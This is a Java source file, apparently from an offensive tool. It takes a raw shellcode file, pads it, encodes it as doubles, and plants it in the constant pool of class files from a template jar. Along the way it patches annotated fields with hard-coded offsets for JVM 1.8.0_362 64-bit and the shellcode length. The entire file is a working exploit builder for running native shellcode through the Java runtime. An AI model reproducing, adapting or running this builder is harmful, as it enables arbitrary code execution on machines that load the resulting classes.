package ghp.transformer;

import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.Type;
import org.objectweb.asm.tree.*;
import pl.memexurer.siurtransformer.TransformationBootstrapBuilder;
import pl.memexurer.siurtransformer.exporter.file.zip.ZipTransformerFileExporter;
import pl.memexurer.siurtransformer.loader.file.TransformerFile;

import java.io.File;
import java.nio.ByteBuffer;
import java.nio.file.Files;
import java.util.*;
import java.util.function.Consumer;

public class Main {
    private static final int DOUBLE_SIZE = Double.SIZE / Byte.SIZE;

    public static byte[] nopPadding(byte[] byteArray, int padding) {
        int toAdd = padding - byteArray.length % padding;
        if (toAdd == 0)
            return byteArray;

        byte[] bytesNew = new byte[byteArray.length + toAdd];
        System.arraycopy(byteArray, 0, bytesNew, 0, byteArray.length);
        for (int i = byteArray.length; i < byteArray.length + toAdd; i++) {
            bytesNew[i] = 0x60;
        }

        return bytesNew;
    }

    public static double[] toDoubleArray(byte[] byteArray) {
        double[] doubles = new double[byteArray.length / DOUBLE_SIZE];
        for (int i = 0; i < doubles.length; i++) {
            doubles[i] = ByteBuffer.wrap(byteArray, i * DOUBLE_SIZE, DOUBLE_SIZE).getDouble();
        }
        return doubles;
    }

    public static void main(String[] args) throws Throwable {
        byte[] orginal = Files.readAllBytes(new File(args[0]).toPath());
        byte[] padded =  nopPadding(orginal, DOUBLE_SIZE);
        double[] doubler = toDoubleArray(
                padded
        );
        Map<String, Long> platformVariables = PlatformVariables.jvm1_8_0_362_64bit();
        System.out.println("Current platform variables: " + platformVariables + " (jvm1_8_0_362_64bit) ");

        if(doubler.length > 0xFFFF) {
            System.out.println("Shellcode length: " + padded.length + " bytes");
            System.out.println("Shellcode is too big: will have to split to " + doubler.length / 0xFFFF + " classes");
            return;
        }

        if(padded.length > 2000) {
            System.out.println("Shellcode is too big: will need a bootstrapper with memory allocation");
        }

        new TransformationBootstrapBuilder()
                .withInputFile(new File(args[1]))
                .execute(new Consumer<TransformerFile>() {
                    @Override
                    public void accept(TransformerFile file) {
                        file.getClasses().removeIf(aClass -> aClass.getParsedNode().name.contains("PlatformVariable"));

                        for (TransformerFile.Class clazz : file.getClasses()) {
                            List<String> toRemove = new ArrayList<>();

                            for (MethodNode methodNode : clazz.getParsedNode().methods) {
                                for (AbstractInsnNode abstractInsnNode : methodNode.instructions) {
                                    if (abstractInsnNode.getOpcode() == Opcodes.GETSTATIC) {
                                        FieldInsnNode fieldInsnNode = (FieldInsnNode) abstractInsnNode;
                                        if (fieldInsnNode.owner.equals(clazz.getParsedNode().name)) {
                                            FieldNode fieldNode = findFieldNode(
                                                    clazz.getParsedNode(),
                                                    fieldInsnNode.name,
                                                    fieldInsnNode.desc
                                            );

                                            if (fieldNode.visibleAnnotations.isEmpty())
                                                continue;

                                            toRemove.add(fieldNode.name);

                                            String fieldName = (String) fieldNode.visibleAnnotations.get(0).values.get(1);
                                            String type = Type.getType(fieldNode.desc).getClassName();

                                            Map<String, Long> vals = new HashMap<>(platformVariables);
                                            vals.put("shellcodeLength", (long) doubler.length);

                                            LdcInsnNode valueNode;
                                            if (type.equals("int")) {
                                                valueNode = new LdcInsnNode(Math.toIntExact(vals.get(fieldName)));
                                            } else if (type.equals("long")) {
                                                valueNode = new LdcInsnNode(vals.get(fieldName));
                                            } else {
                                                throw new RuntimeException("Unexpected type!");
                                            }

                                            if(valueNode.cst == null) {
                                                System.out.println(fieldName + " <--- invalid platform variable");
                                            }

                                            methodNode.instructions.set(fieldInsnNode, valueNode);
                                        }
                                    }
                                }
                            }

                            clazz.getParsedNode().fields.removeIf(node -> toRemove.contains(node.name));
                        }
                    }
                }).export(new ZipTransformerFileExporter(new File(args[2])), classFile -> {
                    ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_MAXS);

                    for (double v : doubler) {
                        writer.symbolTable.constantPool.putByte(6).putLong(Double.doubleToRawLongBits(v));
                        writer.symbolTable.constantPoolCount += 2;
                    }

                    System.out.println("Writing to " + args[2]);

                    classFile.getNode().accept(writer);

                    return writer.toByteArray();
                });
    }

    private static FieldNode findFieldNode(ClassNode node, String name, String desc) {
        for (FieldNode fieldNode : node.fields) {
            if (fieldNode.name.equals(name) && fieldNode.desc.equals(desc)) {
                return fieldNode;
            }
        }

        return null;
    }
}
